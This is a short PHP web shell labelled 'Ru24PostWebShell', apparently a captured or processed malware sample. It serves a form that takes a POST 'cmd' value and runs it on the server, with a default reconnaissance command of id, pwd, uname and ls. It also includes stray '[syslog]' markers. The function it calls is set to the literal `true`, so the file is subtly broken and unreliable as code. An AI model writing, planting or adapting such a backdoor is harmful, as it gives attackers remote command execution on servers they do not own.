<?php
echo '[syslog]01
'; error_reporting(0); $spf2465f = true; echo '<html>
<head>
<title>Ru24PostWebShell - ' . $_POST['cmd'] . '</title>
<meta http-equiv=\'pragma\' content=\'no-cache\'>
</head><body>'; echo '<form method=post>'; echo '<input type=text name=cmd size=85>'; echo '</form>'; echo '<pre>'; echo '[syslog]03
'; if (!$_POST['cmd'] || $_POST['cmd'] == '') { $_POST['cmd'] = 'id;pwd;uname -a;ls -la'; } echo '' . $spf2465f($_POST['cmd']) . '</pre></body></html>'; echo '[syslog]02
';